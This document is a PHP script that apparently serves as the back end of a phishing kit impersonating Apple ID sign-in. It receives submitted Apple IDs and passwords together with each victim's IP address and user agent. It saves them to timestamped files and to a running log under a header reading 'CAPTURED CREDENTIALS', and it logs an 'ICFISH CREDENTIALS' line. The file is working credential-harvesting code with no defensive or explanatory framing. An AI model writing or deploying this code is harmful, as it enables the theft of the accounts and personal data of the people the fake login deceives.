<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || empty($data['appleid']) || empty($data['password'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing required fields']);
    exit;
}

$appleid = substr(trim($data['appleid']), 0, 255);
$password = substr($data['password'], 0, 255);
$remember = !empty($data['remember']) ? 'Yes' : 'No';
$userAgent = substr($data['userAgent'] ?? 'Unknown', 0, 500);
$timestamp = $data['timestamp'] ?? 'Unknown';

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '-';
$method = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';

$credsDir = dirname(__DIR__) . '/creds';
if (!file_exists($credsDir)) {
    mkdir($credsDir, 0755, true);
}

$ts = date('Y-m-d_H-i-s');
$filename = $credsDir . '/credentials_' . $ts . '.txt';

$sep = str_repeat('═', 55);
$logEntry = <<<LOG
{$sep}
CAPTURED CREDENTIALS
{$sep}
Timestamp:    {$ts}
Apple ID:     {$appleid}
Password:     {$password}
Remember Me:  {$remember}
IP Address:   {$ip}
X-Forwarded:  {$forwarded}
User-Agent:   {$userAgent}
Method:       {$method}
{$sep}

LOG;

file_put_contents($filename, $logEntry);
file_put_contents($credsDir . '/all_credentials.log', $logEntry, FILE_APPEND);

error_log("ICFISH CREDENTIALS | {$ip} | {$appleid}");

echo json_encode(['status' => 'success']);
